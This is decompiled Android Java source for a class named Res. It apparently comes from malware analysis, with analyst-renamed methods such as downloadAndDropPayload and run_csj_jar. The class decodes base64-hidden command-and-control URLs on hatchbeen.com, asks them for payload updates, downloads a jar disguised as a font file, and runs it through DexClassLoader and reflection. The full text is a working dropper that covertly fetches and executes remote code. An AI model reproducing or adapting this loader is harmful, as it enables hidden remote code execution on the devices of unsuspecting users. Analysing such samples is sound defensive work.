package com.ljtq.res;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo$State;
import android.net.NetworkInfo;
import android.os.Handler;
import android.os.Message;
import android.text.TextUtils;
import com.ljtq.res.ut.DownloadManager;
import com.ljtq.res.ut.FileNameManager;
import com.ljtq.res.ut.RandomUtilityManager;
import com.ljtq.res.ut.ResponseHandlerInterface;
import com.ljtq.res.ut.SharedPreferencesInterface;
import com.ljtq.res.ut.SharedPreferencesManager;
import dalvik.system.DexClassLoader;
import java.io.File;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import org.json.JSONException;
import org.json.JSONObject;

public class Res {
    final class com.ljtq.res.Res$1 extends Handler {
        com.ljtq.res.Res$1() {
            super();
        }

        public final void handleMessage(Message message) {
            switch(message.what) {
                case 0: {
                    Res.c();
                    Res.d();
                    break;
                }
                case 1: {
                    String csj_ttf_MD5 = DownloadManager.calculateMD5String(String.valueOf(Res.csj_absolute_path) + File.separator + FileNameManager.filename_ttf);
                    String m5 = SharedPreferencesManager.getString(Res.getContext(), "m5", "");
                    if(!TextUtils.isEmpty(((CharSequence)csj_ttf_MD5)) && (csj_ttf_MD5.equals(m5))) {
                        Res.d();
                        return;
                    }

                    new StringBuilder("md5校验失败！:").append(csj_ttf_MD5).append("   --sm5").append(m5);
                    break;
                }
            }
        }
    }

    final class com.ljtq.res.Res$2 implements SharedPreferencesInterface {
        com.ljtq.res.Res$2() {
            super();
        }

        public final void saveCoreVersion(String coreVersion) {
            SharedPreferencesManager.putString(Res.getContext(), "core_verion", coreVersion);
            new StringBuilder("core_version = ").append(SharedPreferencesManager.getString(Res.getContext(), "core_verion", "23"));
            Res.getMessageHandler().sendEmptyMessage(0);
        }

        public final void getCoreVersion() {
            SharedPreferencesManager.putString(Res.getContext(), "core_verion", "1");
        }
    }

    private static DexClassLoader dexClassLoader;
    private static Res instance;
    private static Context ctx;
    public static String csj_absolute_path;
    private SharedPreferencesInterface spi;
    private static Handler mHandler;

    static {
        Res.mHandler = new com.ljtq.res.Res$1();
    }

    private Res(Context ctx) {
        super();
        this.spi = new com.ljtq.res.Res$2();
        Res.ctx = ctx;
    }

    static SharedPreferencesInterface getSharedPreferencesInterface(Res instance) {
        return instance.spi;
    }

    private static DexClassLoader load_csj_jar_payload(Context ctx) {
        String dexClassLoader = null;
        File csj_jar = new File(String.valueOf(Res.csj_absolute_path) + File.separator + FileNameManager.filename_jar);
        if(csj_jar.exists()) {
            csj_jar.length();
        }

        DexClassLoader res = !csj_jar.exists() || csj_jar.length() == 0 ? ((DexClassLoader)dexClassLoader) : new DexClassLoader(csj_jar.getAbsolutePath(), csj_jar.getParent(), dexClassLoader, ctx.getClassLoader());
        return res;
    }

    private static Map JSON2Map(String JSONResponse) {
        HashMap res;
        Map v1;
        Map v6 = null;
        try {
            JSONObject JSONObj = new JSONObject(JSONResponse);
            if(JSONObj.getString("code").equals("0")) {
                v1 = v6;
                goto label_9;
            }

            String result = JSONObj.getString("result").trim();
            String version_code = JSONObj.getString("version_code").trim();
            String address = JSONObj.getString("address").trim();
            String md5 = JSONObj.getString("md5").trim();
            if("yes".equals(result)) {
                res = new HashMap();
                ((Map)res).put("version_code", version_code);
                ((Map)res).put("address", address);
                ((Map)res).put("update", "yes");
                ((Map)res).put("md5", md5);
                goto label_9;
            }

            res = new HashMap();
            ((Map)res).put("update", "no");
            ((Map)res).put("version_code", version_code);
            ((Map)res).put("address", address);
            ((Map)res).put("md5", md5);
        }
        catch(JSONException ex) {
            ex.printStackTrace();
            v1 = v6;
        }

    label_9:
        return ((Map)res);
    }

    private static void run_csj_jar() {
        DexClassLoader dcl;
        DexClassLoader csj_jar_dcl = null;
        try {
            if(Res.dexClassLoader == null) {
                Context ctx = Res.ctx;
                File csj_jar = new File(String.valueOf(Res.csj_absolute_path) + File.separator + FileNameManager.filename_jar);
                if(csj_jar.exists()) {
                    csj_jar.length();
                }

                if(!csj_jar.exists() || csj_jar.length() == 0) {
                    dcl = csj_jar_dcl;
                    goto label_24;
                label_43:
                    dcl = new DexClassLoader(csj_jar.getAbsolutePath(), csj_jar.getParent(), null, ctx.getClassLoader());
                }
                else {
                    goto label_43;
                }

            label_24:
                Res.dexClassLoader = dcl;
            }

            Res.dexClassLoader.loadClass("com.ljtq.res.impl.Lauch").getDeclaredMethod("run", Context.class).invoke(null, Res.ctx);
        }
        catch(Exception ex) {
            ex.printStackTrace();
            Res.dexClassLoader = csj_jar_dcl;
        }
    }

    private static void cleanUselessFiles(String path, SharedPreferencesInterface spi, String arg15, String arg16) {
        String path = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
        String csj_ttf = String.valueOf(Res.csj_absolute_path) + File.separator + FileNameManager.filename_ttf;
        String csj_jar = String.valueOf(Res.csj_absolute_path) + File.separator + FileNameManager.filename_jar;
        String csj_dex = String.valueOf(Res.csj_absolute_path) + File.separator + FileNameManager.filename_dex;
        String csj_temp = String.valueOf(Res.csj_absolute_path) + File.separator + path + ".temp";
        File csj_temp_file = new File(csj_temp);
        File csj_jar_file = new File(csj_jar);
        File csj_dex_file = new File(csj_dex);
        File csj_ttf_file = new File(csj_ttf);
        if(csj_ttf_file.exists()) {
            csj_ttf_file.delete();
        }

        if(csj_jar_file.exists()) {
            csj_jar_file.delete();
        }

        if(csj_temp_file.exists()) {
            csj_temp_file.delete();
        }

        if(csj_dex_file.exists()) {
            csj_dex_file.delete();
        }

        DownloadManager.getInstance(Res.ctx).setSharedPreferencesInterface(spi);
        DownloadManager.getInstance(Res.ctx).downloadAndDropPayload(arg15, path, arg16, csj_temp, csj_ttf, csj_jar);
    }

    private static DexClassLoader getDexClassLoader() {
        return Res.dexClassLoader;
    }

    static Map JSON2MapStub(String str) {
        return Res.JSON2Map(str);
    }

    static void downloadAndDropPayload(String URL, SharedPreferencesInterface spi, String version_code, String md5) {
        String path = URL.substring(URL.lastIndexOf("/") + 1, URL.lastIndexOf("."));
        String csj_ttf = String.valueOf(Res.csj_absolute_path) + File.separator + FileNameManager.filename_ttf;
        String csj_jar = String.valueOf(Res.csj_absolute_path) + File.separator + FileNameManager.filename_jar;
        String csj_dex = String.valueOf(Res.csj_absolute_path) + File.separator + FileNameManager.filename_dex;
        String csj_temp = String.valueOf(Res.csj_absolute_path) + File.separator + path + ".temp";
        File csj_temp_file = new File(csj_temp);
        File csj_jar_file = new File(csj_jar);
        File csj_dex_file = new File(csj_dex);
        File csj_ttf_file = new File(csj_ttf);
        if(csj_ttf_file.exists()) {
            csj_ttf_file.delete();
        }

        if(csj_jar_file.exists()) {
            csj_jar_file.delete();
        }

        if(csj_temp_file.exists()) {
            csj_temp_file.delete();
        }

        if(csj_dex_file.exists()) {
            csj_dex_file.delete();
        }

        DownloadManager.getInstance(Res.ctx).setSharedPreferencesInterface(spi);
        DownloadManager.getInstance(Res.ctx).downloadAndDropPayload(version_code, URL, md5, csj_temp, csj_ttf, csj_jar);
    }

    static void c() {
        Res.dexClassLoader = null;
    }

    static void d() {
        DexClassLoader v0_1;
        DexClassLoader v1 = null;
        try {
            if(Res.dexClassLoader == null) {
                Context v2 = Res.ctx;
                File v3 = new File(String.valueOf(Res.csj_absolute_path) + File.separator + FileNameManager.filename_jar);
                if(v3.exists()) {
                    v3.length();
                }

                if(!v3.exists() || v3.length() == 0) {
                    v0_1 = v1;
                    goto label_24;
                label_43:
                    v0_1 = new DexClassLoader(v3.getAbsolutePath(), v3.getParent(), null, v2.getClassLoader());
                }
                else {
                    goto label_43;
                }

            label_24:
                Res.dexClassLoader = v0_1;
            }

            Res.dexClassLoader.loadClass("com.ljtq.res.impl.Lauch").getDeclaredMethod("run", Context.class).invoke(null, Res.ctx);
        }
        catch(Exception v0) {
            v0.printStackTrace();
            Res.dexClassLoader = v1;
        }
    }

    static Context getContext() {
        return Res.ctx;
    }

    static Handler getMessageHandler() {
        return Res.mHandler;
    }

    public static Res get(Context ctx) {
        if(Res.instance == null) {
            Class class = Res.class;
            __monitor_enter(class);
            try {
                if(Res.instance == null) {
                    Res.instance = new Res(ctx);
                }

                __monitor_exit(class);
            }
            catch(Throwable th) {
                try {
                label_13:
                    __monitor_exit(class);
                }
                catch(Throwable th) {
                    goto label_13;
                }

                throw th;
            }
        }

        return Res.instance;
    }

    public void init(String cip, String pid) {  // "maopao03", "maopao03"
        int i;
        int size = 3;
        int index = 2;
        if(Res.ctx != null && !TextUtils.isEmpty(((CharSequence)cip)) && !TextUtils.isEmpty(((CharSequence)pid))) {
            SharedPreferencesManager.putString(Res.ctx, "cid", cip);
            SharedPreferencesManager.putString(Res.ctx, "pid", pid);
            Object connectivityManager = Res.ctx.getSystemService("connectivity");
            if(connectivityManager != null) {
                NetworkInfo[] networksInfo = ((ConnectivityManager)connectivityManager).getAllNetworkInfo();
                if(networksInfo == null) {
                    goto label_28;
                }
                else if(networksInfo.length > 0) {
                    i = 0;
                    while(true) {
                        if(i >= networksInfo.length) {
                            goto label_28;
                        }
                        else if(networksInfo[i].getState() == NetworkInfo$State.CONNECTED) {
                            i = 1;
                        }
                        else {
                            ++i;
                            continue;
                        }

                        break;
                    }
                }
                else {
                    goto label_28;
                }
            }
            else {
            label_28:
                i = 0;
            }

            if(i == 0) {
                return;
            }

            Res.csj_absolute_path = Res.ctx.getDir("csj", 0).getAbsolutePath();
            String URL = new Random().nextInt(10) % 2 == 0 ? RandomUtilityManager.base64DecodeString("aHR0cDovL24xNTEuaGF0Y2hiZWVuLmNvbTo4MDgwL2Fkdl9wbGF0Zm9ybS9nZXRKYXJWZXJzaW9uL2NwaWQvdmVyc2lvbl9jb2RlL2NvdW50cnk=") : RandomUtilityManager.base64DecodeString("aHR0cDovL24xNTIuaGF0Y2hiZWVuLmNvbTo4MDgwL2Fkdl9wbGF0Zm9ybS9nZXRKYXJWZXJzaW9uL2NwaWQvdmVyc2lvbl9jb2RlL2NvdW50cnk=");  // http://n151.hatchbeen.com:8080/adv_platform/getJarVersion/cpid/version_code/country / http://n152.hatchbeen.com:8080/adv_platform/getJarVersion/cpid/version_code/country
            String[] args_array_1 = new String[size];
            args_array_1[0] = "cpid";
            args_array_1[1] = "version_code";
            args_array_1[index] = "country";
            String[] args_array_2 = new String[size];
            args_array_2[0] = cip;
            args_array_2[1] = SharedPreferencesManager.getString(Res.ctx, "core_verion", "23");
            args_array_2[index] = "cn";
            RandomUtilityManager.executeRequest(TextUtils.replace(((CharSequence)URL), args_array_1, ((CharSequence[])args_array_2)).toString(), new ResponseHandlerInterface() {
                public final void handleException(Exception ex) {
                    ex.printStackTrace();
                }

                public final void handleResponse(String response) {
                    new StringBuilder("onFinish  response = ").append(response.trim());
                    if(response != null && !"".equals(response.trim())) {
                        Res.getContext();
                        Map responseMap = Res.JSON2MapStub(response);
                        if(responseMap == null) {
                            return;
                        }

                        Object address = responseMap.get("address");
                        Object version_code = responseMap.get("version_code");
                        Object md5 = responseMap.get("md5");
                        SharedPreferencesManager.putString(Res.getContext(), "m5", new StringBuilder(String.valueOf(md5)).toString());
                        new StringBuilder("address:").append(((String)address)).append("--versionCode:").append(((String)version_code)).append(" -- md5 = ").append(((String)md5));
                        if("yes".equals(responseMap.get("update"))) {
                            try {
                                Res.downloadAndDropPayload(((String)address), Res.getSharedPreferencesInterface(this.f), ((String)version_code), ((String)md5));
                            }
                            catch(Exception ex) {
                                ex.printStackTrace();
                            }
                        }
                        else {
                            Res.getMessageHandler().sendEmptyMessage(1);
                        }
                    }
                }
            });
        }
    }
}

